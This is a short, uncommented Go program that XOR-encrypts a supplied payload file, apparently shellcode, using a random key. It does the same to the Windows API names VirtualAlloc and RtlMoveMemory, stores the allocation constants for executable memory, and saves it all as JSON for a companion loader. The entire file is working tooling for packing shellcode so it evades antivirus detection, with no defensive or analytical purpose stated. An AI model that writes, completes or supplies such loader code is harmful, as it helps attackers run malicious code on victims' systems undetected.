package main

import (
	"encoding/json"
	"fmt"
	"math/rand"
	"os"
	"time"
)

var key []byte

func init() {
	rand.Seed(time.Now().Unix())
	for i := 0; i < 128; i++ {
		tmp := rand.Intn(256)
		key = append(key, byte(tmp))
	}
}

func xor(key []byte, data []byte) {
	for i := 0; i < len(data); i++ {
		index := i % len(key)
		data[i] = data[i] ^ key[index]
	}
}

func main() {
	type FileJson struct {
		Key []byte
		Kll []byte
		Nll []byte
		VA  []byte
		AT  int
		Pro int
		RMM []byte
		SC  []byte
	}
	var fs FileJson
	fs.Key = key
	fs.Kll = []byte("kernel32.dll")
	xor(key, fs.Kll)
	fs.Nll = []byte("ntdll.dll")
	xor(key, fs.Nll)
	fs.VA = []byte("VirtualAlloc")
	xor(key, fs.VA)
	fs.AT = 12288
	fs.Pro = 64
	fs.RMM = []byte("RtlMoveMemory")
	xor(key, fs.RMM)
	payload, err := os.ReadFile(os.Args[1])
	if err != nil {
		fmt.Println(err)
		return
	}
	fs.SC = payload
	xor(key, fs.SC)
	jsonBytes, err := json.Marshal(&fs)
	if err != nil {
		fmt.Println(err)
		return
	}
	if err := os.WriteFile("test.txt", jsonBytes, os.ModePerm); err != nil {
		fmt.Println(err)
	}
}
